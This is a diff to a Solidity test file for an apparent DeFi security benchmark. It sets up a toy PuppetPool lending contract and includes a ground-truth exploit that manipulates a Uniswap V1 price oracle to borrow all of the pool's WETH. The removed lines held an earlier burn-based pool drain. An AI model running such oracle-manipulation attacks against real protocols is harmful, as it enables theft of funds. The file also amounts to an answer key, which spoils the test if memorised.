@@ -6,80 +6,87 @@ import "forge-std/Test.sol";
 import "@utils/ERC20Basic.sol";
 import "@utils/UniswapV1.sol";
 
-import "benchmarks/TokenBurn/BurningToken.sol";
-import "benchmarks/TokenBurn/Handler.sol";
+import "benchmarks/toy/PuppetPool/PuppetPool.sol";
+import "benchmarks/toy/PuppetPool/Handler.sol";
 
-contract TokenBurnTest is Test {
+contract PuppetPoolTest is Test {
     address owner;
     address attacker;
 
-    BurningToken token;
+    ERC20Basic token;
     WETH weth;
     UniswapV1 uniswap;
-    TokenBurnHandler handler;
+    PuppetPool puppetpool;
+    PuppetPoolHandler handler;
 
     uint256 public totalSupply = 1000 ether;
     uint256 public feeRate = 15;
 
-    uint256 public attackerInitBalance = 0 ether;
-    uint256 public attackerInitToken = 1 ether;
+    uint256 public attackerInitBalance = 10 ether;
+    uint256 public attackerInitToken = 10 ether;
 
     uint256 public uniswapInitBalance = 10 ether;
     uint256 public uniswapInitToken = 10 ether;
 
-    uint256 public requiredBalance = attackerInitToken;
+    uint256 public puppetpoolInitBalance = 100 ether;
+
+    uint256 public requiredBalance =
+        puppetpoolInitBalance + attackerInitBalance;
 
     function setUp() public {
         owner = address(0xdeadbeef);
         attacker = address(this);
 
         vm.startPrank(owner);
-        token = new BurningToken(totalSupply);
+        token = new ERC20Basic(totalSupply);
         weth = new WETH(totalSupply);
         uniswap = new UniswapV1(address(token), address(weth), feeRate);
-        handler = new TokenBurnHandler(
+        puppetpool = new PuppetPool(
+            address(token),
+            address(weth),
+            address(uniswap)
+        );
+        handler = new PuppetPoolHandler(
             owner,
             attacker,
             address(token),
             address(weth),
-            address(uniswap)
+            address(uniswap),
+            address(puppetpool)
         );
         token.transfer(attacker, attackerInitToken);
         token.transfer(address(uniswap), uniswapInitToken);
 
         weth.transfer(attacker, attackerInitBalance);
         weth.transfer(address(uniswap), uniswapInitBalance);
+        weth.transfer(address(puppetpool), puppetpoolInitBalance);
         vm.stopPrank();
 
         excludeContract(address(token));
         excludeContract(address(weth));
         excludeContract(address(uniswap));
+        excludeContract(address(puppetpool));
 
-        token.approve(address(uniswap), UINT256_MAX);
+        // To be fair.
         weth.approve(address(uniswap), UINT256_MAX);
     }
 
     function printBalance() internal {
-        emit log_named_decimal_uint(
-            "WETH Balance",
-            weth.balanceOf(attacker),
-            18
-        );
-        emit log_named_decimal_uint(
-            "Token Balance",
-            token.balanceOf(attacker),
-            18
-        );
+        emit log_named_decimal_uint("WETH Balance", weth.balanceOf(attacker), 18);
+        emit log_named_decimal_uint("Token Balance", token.balanceOf(attacker), 18);
     }
 
     function testAttackGT() public {
-        token.burn(address(uniswap), token.balanceOf(address(uniswap)) - 1);
+        token.approve(address(puppetpool), UINT256_MAX);
+        token.approve(address(uniswap), UINT256_MAX);
+        uniswap.swapWETHToToken(attackerInitBalance);
+        puppetpool.borrowWETH(puppetpoolInitBalance);
         uniswap.swapTokenToWETH(token.balanceOf(attacker));
         printBalance();
         require(weth.balanceOf(attacker) >= requiredBalance, "Attack Failed!");
     }
 
-    function invariantNoProfit() public {
-        assertLt(weth.balanceOf(attacker), requiredBalance);
+    function invariantNoProfit() external {
+        assertLe(weth.balanceOf(attacker), requiredBalance);
     }
 }
